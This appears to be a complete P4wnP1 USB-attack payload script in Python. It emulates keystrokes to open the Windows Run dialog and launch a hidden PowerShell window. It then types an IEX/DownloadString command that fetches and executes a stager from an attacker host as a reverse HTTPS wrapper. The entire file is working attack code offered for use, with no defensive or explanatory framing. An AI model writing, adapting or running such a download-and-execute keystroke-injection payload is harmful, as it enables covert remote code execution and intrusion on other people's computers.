#!/usr/bin/env python3
import os, sys, time, pathlib
P4WN_HOME=os.environ.get("P4WN_HOME","/opt/p4wnp1")
sys.path.insert(0,str(pathlib.Path(P4WN_HOME)/"tools"))
from hid_type import win_r, type_string

LHOST = os.getenv("P4WN_LHOST","10.0.0.1")
LPORT = os.getenv("P4WN_LPORT","443")
URI   = os.getenv("P4WN_URI","/payloads/stager.ps1")   # serve this from payloads/www

def main():
    print("[*] Reverse HTTPS wrapper to", LHOST, LPORT, URI)
    win_r(); time.sleep(0.4)
    type_string("powershell -nop -w hidden\n"); time.sleep(0.3)
    ps = f"IEX(New-Object Net.WebClient).DownloadString('https://{LHOST}:{LPORT}{URI}')"
    type_string(ps + "\n")
if __name__ == "__main__": main()
